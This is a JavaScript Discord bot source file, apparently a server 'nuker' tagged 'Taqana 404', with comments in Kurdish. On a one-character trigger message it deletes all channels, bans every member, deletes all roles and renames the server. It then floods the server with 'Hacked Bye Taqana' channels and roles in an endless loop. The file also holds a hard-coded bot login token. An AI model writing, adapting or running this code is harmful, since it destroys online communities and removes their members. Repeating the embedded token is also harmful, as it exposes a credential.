const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "404p";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName(" 💣Taqana 404💣 ");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel(" Hacked Bye Taqana ");///////bo channel 
        message.guild.createChannel(" Hacked Bye Taqana ");////bo voice
        message.guild.createRole({ name: " Big Taqana " });////nawek dane bo role kan
      });
    }
  }
});

client.login("MTU0ODMwMjE5NzMyMDg1MTQ5Nw.GkxrBZ.CvCB8nCRHIVdOTdABuk83kp9DOtd5EsiE0X1gk")

////Respect Up////
